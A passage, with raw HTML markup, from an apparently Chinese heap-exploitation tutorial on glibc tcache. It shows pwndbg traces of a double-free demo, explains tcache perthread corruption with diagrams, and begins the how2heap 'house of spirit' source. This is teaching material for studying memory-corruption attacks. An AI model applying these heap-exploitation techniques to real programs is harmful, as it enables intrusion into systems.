 <span class="nf">R9</span>   <span class="mi">0x7fffffffb79c</span> <span class="err">?—</span> <span class="mi">0x1a00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x5555555547fc</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555547e4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">138</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x171</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555547eb</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">145</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fwrite@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554630</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555547f0</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555547f4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">154</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555547f7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">157</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x5555555547fc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554800</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">166</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554803</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">169</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x555555554808</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555480f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">181</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554813</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">185</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
    <span class="err">9</span>   <span class="nf">int</span> <span class="p">*</span><span class="no">a</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">10</span> 
   <span class="err">11</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">12</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">twice...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">13</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
 <span class="err">?</span> <span class="err">14</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">15</span> 
   <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Next</span> <span class="no">allocated</span> <span class="no">buffers</span> <span class="no">will</span> <span class="no">be</span> <span class="no">same</span><span class="p">:</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="c1">;</span>
   <span class="err">18</span> 
   <span class="err">19</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c1">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3d8</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
</code></pre></div>
tcache 的第一条链放入了一个 chunk</p>
<p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">16</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x555555756260</span> <span class="cm">/* &#39;`buUUU&#39; */</span>
 <span class="nf">RDI</span>  <span class="mi">0x2</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x2</span>
 <span class="nf">R8</span>   <span class="mi">0x1</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb79c</span> <span class="err">?—</span> <span class="mi">0x1a00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554808</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555547f4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">154</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555547f7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">157</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555547fc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554800</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">166</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554803</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">169</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554808</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555480f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">181</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554813</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">185</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554817</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">189</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x152</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">196</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554821</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">199</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">11</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">12</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">twice...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">13</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">14</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">15</span> 
 <span class="err">?</span> <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Next</span> <span class="no">allocated</span> <span class="no">buffers</span> <span class="no">will</span> <span class="no">be</span> <span class="no">same</span><span class="p">:</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="c1">;</span>
   <span class="err">18</span> 
   <span class="err">19</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c1">;</span>
   <span class="err">20</span> <span class="err">}</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x555555756260</span> <span class="cm">/* &#39;`buUUU&#39; */</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfe8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0b8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3d8</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555756260</span> <span class="p">(</span><span class="no">overlap</span> <span class="no">chunk</span> <span class="no">with</span> <span class="mi">0x555555756250</span><span class="p">(</span><span class="no">freed</span><span class="p">)</span> <span class="p">)</span>
</code></pre></div>
可以看出，这种方法与 <code>fastbin dup</code> 相比也简单了很多。</p>
<h4 id="tcache-perthread-corruption">tcache perthread corruption<a class="headerlink" href="#tcache-perthread-corruption" title="Permanent link">&para;</a></h4>
<p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p>这里没找到太好的例子，自己想了一种情况</p>
<p>设想有如下的堆排布情况
<div class="highlight"><pre><span></span><code>tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |---------&gt;+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
</code></pre></div>
通过一些手段（如 <code>tcache posioning</code>），我们将其改为了
<div class="highlight"><pre><span></span><code>tcache_    +------------+&lt;---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |---------&gt;+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
</code></pre></div>
这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
<p><strong>因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p>
<h4 id="tcache-house-of-spirit">tcache house of spirit<a class="headerlink" href="#tcache-house-of-spirit" title="Permanent link">&para;</a></h4>
<p>拿 how2heap 的源码来讲：</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the house of spirit attack on tcache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
